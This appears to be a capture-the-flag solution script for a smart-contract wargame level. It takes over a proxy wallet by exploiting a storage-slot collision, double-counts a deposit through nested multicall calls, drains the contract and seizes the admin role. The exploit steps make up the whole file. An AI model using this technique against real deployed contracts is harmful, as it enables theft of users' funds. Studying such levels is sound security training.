/* Tools needed for this level:
- Console
*/

// 1.- Declare a variable with the proposeNewAdmin() function signature in JSON format:
functionSig = {
	name: 'proposeNewAdmin',
	type: 'function',
	inputs: [
		{
			type: 'address',
			name: '_newAdmin',
		},
	],
}

// 2.- Encode the data of the signature and the parameters (player's address) for
// calling the proposeNewAdmin() function:
data = web3.eth.abi.encodeFunctionCall(functionSig, [player])

// 3.- Execute the transaction with the previously declared data.
// This will create a storage clash between the contracts and store the player's
// address as pendingAdmin in PuzzeProxy and the owner in PuzzeWallet, as they share
// the same storage slot (0).
await web3.eth.sendTransaction({from: player, to: instance, data})

// 4.- Add player to whitelist so that we can execute the following functions, since we are
// owner and can pass the requirement in the function:
await contract.addToWhitelist(player)

// 5.- Assign the signature of the deposit() function to a variable:
depositData = web3.eth.abi.encodeFunctionSignature('deposit()')

// 6.- Assign the signature of the multicall() function to a variable:
multicallData = await contract.methods['multicall(bytes[])']
	.request([depositData])
	.then((v) => v.data)

// 7.- Execute the multicall function passing the data containing its own signature and
// the data params, for executing the muticall function twice, executing the deposit()
// function twice as well:
await contract.multicall([multicallData, multicallData], {value: toWei('0.001')})

// 8.- Check that the balance of the contract is now 0.002 ETH
await getBalance(instance)

// 9.- Execute the execute() function for draining the entire contract's balance and be able to
// execute the setMaxBalance() function (since its requirement is fot he balance to equal zero):
await contract.execute(player, toWei('0.002'), 0x0)

// 10.- Now that the contract's balance is zero, we can execute setMaxPlayer() and take advantage of
// the storage collisions between the contracts, becoming the admin on PuzzeProxy:
await contract.setMaxBalance(player)
